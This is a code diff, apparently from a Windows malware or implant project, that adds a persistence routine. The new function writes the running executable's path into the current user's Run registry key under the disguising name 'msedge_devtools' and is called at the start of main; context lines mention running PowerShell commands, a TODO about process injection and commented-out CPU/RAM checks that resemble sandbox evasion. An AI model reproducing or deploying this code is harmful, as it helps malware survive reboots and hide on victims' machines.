@@ -443,8 +443,30 @@ string runPSCommand(string command)
     // TODO: Make this process injection?
 }
 
+void estPersistence() {
+    // Source - https://stackoverflow.com/a
+    // Posted by mxcl, modified by community. See post 'Timeline' for change history
+    // Retrieved 2025-12-03, License - CC BY-SA 3.0
+
+    char pBuf[256];
+    size_t len = sizeof(pBuf); 
+
+    // first param is NULL so it retreives the 
+    // executable path for the current process: MS docs
+    int bytes = GetModuleFileNameA(NULL, pBuf, len);
+
+    HKEY hkey = NULL;
+    RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
+    // pBuf must be null terminated: MS docs for RegSetValueExA
+    // cbdata must include null terminator: MS docs
+    RegSetValueExA(hkey, "msedge_devtools", 0, REG_SZ, (BYTE*)pBuf, bytes + 1); 
+}
+
 int main(int argc, const char **argv)
 {
+    // Establish Persistence
+    estPersistence();
+
     // Run all checks
     // BOOL cpuOK = checkCPU();
     // BOOL ramOK = checkRAM();
